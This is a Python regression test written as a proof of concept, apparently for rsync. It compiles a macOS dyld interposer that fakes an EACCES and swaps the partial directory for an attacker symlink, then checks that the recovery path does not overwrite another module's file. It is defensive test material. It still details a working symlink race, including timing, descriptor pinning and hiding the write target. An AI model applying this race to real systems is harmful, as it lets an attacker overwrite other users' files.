#!/usr/bin/env python3
"""PoC: EACCES recovery must retain partial-dir ownership policy.

The one-inplace partial path is initially opened through the operator ownership
walk.  Model an EACCES from that O_CREAT open, then replace the partial
directory with an attacker symlink.  The production recovery opens drop to the
ordinary resolver, which follows the new parent without an ownership check and
can overwrite a different module file through the returned descriptor.  On
Linux the first recovery is the fs.protected_regular compatibility retry; the
generic read-only-file chmod-and-open recovery has the same policy requirement.
"""

import os
import platform
import subprocess

from rsyncfns import (
    SCRATCHDIR, rmtree, rsync_argv, test_fail, test_skipped,
)


if platform.system() != 'Darwin':
    test_skipped('deterministic partial EACCES recovery uses dyld interposing')

base = SCRATCHDIR / 'partial-protected-regular-retry-policy'
rmtree(base)
src = base / 'src'
mod = base / 'mod'
partial = mod / 'pdir'
held = mod / '.pdir-held'
secret = mod / 'secret'
load_marker = base / 'hook-loaded'
eacces_marker = base / 'operator-open-eacces'
retry_marker = base / 'unconfined-retry-open'
foreign_check_marker = base / 'owner-check-would-refuse'
for directory in (src, partial, secret):
    directory.mkdir(parents=True)

old_partial = b'OLD-PARTIAL-BASIS-' * 4096
new_source = b'NEW-REMOTE-PAYLOAD' * 4096
secret_data = b'OTHER-USER-SECRET!' * 4096
if not (len(old_partial) == len(new_source) == len(secret_data)):
    raise AssertionError('PoC payloads must be equal length')
(partial / 'victim').write_bytes(old_partial)
(secret / 'victim').write_bytes(secret_data)
(src / 'victim').write_bytes(new_source)

hook_src = base / 'partial-protected-retry-hook.c'
hook_lib = base / 'partial-protected-retry-hook.dylib'
hook_src.write_text(r'''
#include <sys/stat.h>
#include <sys/syscall.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int swapped;

static void mark(const char *path)
{
    int fd;
    if (path && (fd = (int)syscall(SYS_open, path,
                                   O_WRONLY | O_CREAT | O_EXCL, 0600)) >= 0)
        close(fd);
}

static int fd_path_is(int fd, const char *wanted)
{
    char path[PATH_MAX];
    return wanted && fcntl(fd, F_GETPATH, path) == 0
        && strcmp(path, wanted) == 0;
}

static void restore_partial(void)
{
    const char *partial = getenv("RSYNC_PARTIAL_RETRY_DIR");
    const char *held = getenv("RSYNC_PARTIAL_RETRY_HELD");
    if (swapped && partial && held) {
        unlink(partial);
        if (rename(held, partial) == 0)
            swapped = 0;
    }
}

static int hook_openat(int dfd, const char *path, int flags, ...)
{
    const char *partial = getenv("RSYNC_PARTIAL_RETRY_DIR");
    const char *held = getenv("RSYNC_PARTIAL_RETRY_HELD");
    const char *secret = getenv("RSYNC_PARTIAL_RETRY_SECRET");
    mode_t mode = 0;
    int fd, saved_errno;

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = (mode_t)va_arg(ap, int);
        va_end(ap);
    }

    /* Model Linux fs.protected_regular: the operator-walk O_CREAT open of the
     * existing partial leaf gets EACCES.  The attacker swaps the parent in the
     * exact interval before rsync's compatibility retry. */
    if (!swapped && path && strcmp(path, "victim") == 0
        && (flags & O_ACCMODE) == O_WRONLY && (flags & O_CREAT)
        && fd_path_is(dfd, partial)) {
        if (rename(partial, held) == 0 && symlink("secret", partial) == 0) {
            swapped = 1;
            mark(getenv("RSYNC_PARTIAL_RETRY_EACCES_MARKER"));
            errno = EACCES;
            return -1;
        }
        restore_partial();
    }

    fd = (int)syscall(SYS_openat, dfd, path, flags, mode);
    saved_errno = errno;

    /* The vulnerable retry omits O_CREAT and resolves the swapped parent via
     * the ordinary path walker.  Keep its returned fd alive but restore the
     * pathname immediately so later cleanup cannot hide the write target. */
    if (swapped && fd >= 0 && path && strcmp(path, "victim") == 0
        && (flags & O_ACCMODE) == O_WRONLY && !(flags & O_CREAT)
        && fd_path_is(dfd, secret)) {
        mark(getenv("RSYNC_PARTIAL_RETRY_OPEN_MARKER"));
        restore_partial();
    }
    errno = saved_errno;
    return fd;
}

static int hook_open(const char *path, int flags, ...)
{
    const char *partial = getenv("RSYNC_PARTIAL_RETRY_DIR");
    const char *held = getenv("RSYNC_PARTIAL_RETRY_HELD");
    mode_t mode = 0;
    int fd, saved_errno;

    if (flags & O_CREAT) {
        va_list ap;
        va_start(ap, flags);
        mode = (mode_t)va_arg(ap, int);
        va_end(ap);
    }

    /* Public releases use plain open() for the first partial-file attempt.
     * Trigger the same EACCES/swap oracle so they serve as behavioral
     * controls: their older retry does not reopen the partial path. */
    if (!swapped && path && strstr(path, "pdir/victim")
        && (flags & O_ACCMODE) == O_WRONLY && (flags & O_CREAT)) {
        if (rename(partial, held) == 0 && symlink("secret", partial) == 0) {
            swapped = 1;
            mark(getenv("RSYNC_PARTIAL_RETRY_EACCES_MARKER"));
            errno = EACCES;
            return -1;
        }
        restore_partial();
    }

    fd = (int)syscall(SYS_open, path, flags, mode);
    saved_errno = errno;

    /* A local receiver uses the same vulnerable policy transition but its
     * final fallback is plain open().  Restore the pathname after pinning the
     * redirected descriptor so later partial-file finalization cannot move
     * the target and obscure which file received the payload. */
    if (swapped && fd >= 0 && path && strstr(path, "pdir/victim")
        && (flags & O_ACCMODE) == O_WRONLY && !(flags & O_CREAT)) {
        mark(getenv("RSYNC_PARTIAL_RETRY_OPEN_MARKER"));
        restore_partial();
    }
    errno = saved_errno;
    return fd;
}

static int hook_fstatat(int dfd, const char *path, struct stat *st, int flags)
{
    int rc = (int)syscall(SYS_fstatat64, dfd, path, st, flags);
    int saved_errno = errno;
    /* If the retry retained the operator walk it would inspect the raced
     * symlink.  Model the attacker as a different uid so that check refuses it. */
    if (rc == 0 && swapped && path && strcmp(path, "pdir") == 0
        && S_ISLNK(st->st_mode)) {
        st->st_uid = geteuid() + 1;
        mark(getenv("RSYNC_PARTIAL_RETRY_FOREIGN_MARKER"));
    }
    errno = saved_errno;
    return rc;
}

__attribute__((constructor)) static void hook_loaded(void)
{
    mark(getenv("RSYNC_PARTIAL_RETRY_LOAD_MARKER"));
}

__attribute__((destructor)) static void hook_unload(void)
{
    restore_partial();
}

__attribute__((used)) static struct {
    const void *replacement;
    const void *replacee;
} interposers[] __attribute__((section("__DATA,__interpose"))) = {
    { (const void *)hook_open, (const void *)open },
    { (const void *)hook_openat, (const void *)openat },
    { (const void *)hook_fstatat, (const void *)fstatat },
};
''')

build = subprocess.run(
    ['cc', '-dynamiclib', '-o', str(hook_lib), str(hook_src)],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
if build.returncode != 0:
    test_skipped(f'cannot build dyld partial retry interposer: {build.stdout!r}')

env_assignments = {
    'DYLD_INSERT_LIBRARIES': str(hook_lib),
    'RSYNC_PARTIAL_RETRY_DIR': str(partial),
    'RSYNC_PARTIAL_RETRY_HELD': str(held),
    'RSYNC_PARTIAL_RETRY_SECRET': str(secret),
    'RSYNC_PARTIAL_RETRY_LOAD_MARKER': str(load_marker),
    'RSYNC_PARTIAL_RETRY_EACCES_MARKER': str(eacces_marker),
    'RSYNC_PARTIAL_RETRY_OPEN_MARKER': str(retry_marker),
    'RSYNC_PARTIAL_RETRY_FOREIGN_MARKER': str(foreign_check_marker),
}
run_env = os.environ.copy()
run_env.update(env_assignments)

result = subprocess.run(
    rsync_argv('-rtI', '--partial', '--partial-dir=pdir',
               '--no-inc-recursive', f'{src}/', f'{mod}/'),
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=run_env)

if held.exists():
    if partial.is_symlink():
        partial.unlink()
    held.rename(partial)
if not load_marker.exists():
    test_fail(
        'positive control failed: dyld retry interposer was not loaded: '
        f'rc={result.returncode}, output={result.stdout!r}')
if not eacces_marker.exists():
    test_fail(
        'positive control failed: receiver did not open the existing partial '
        f'file with O_CREAT (rc={result.returncode}, output={result.stdout!r})')
observed = (secret / 'victim').read_bytes()
if observed == new_source:
    test_fail(
        'EACCES recovery dropped partial-dir ownership policy and overwrote a '
        'different module file through the raced partial-dir symlink')
if observed != secret_data:
    test_fail(f'outside-policy target has unexpected contents after retry: '
              f'rc={result.returncode}, output={result.stdout!r}')
# Anti-vacuity, checked only after the escape assertions above: a vulnerable
# build runs no ownership walk at all, so this must not pre-empt them.
if not foreign_check_marker.exists():
    test_fail('inconclusive: the recovery never inspected the raced partial-dir '
              f'symlink, so no ownership check ran: rc={result.returncode}, '
              f'output={result.stdout!r}')
print('EACCES recovery retained partial-dir ownership policy')
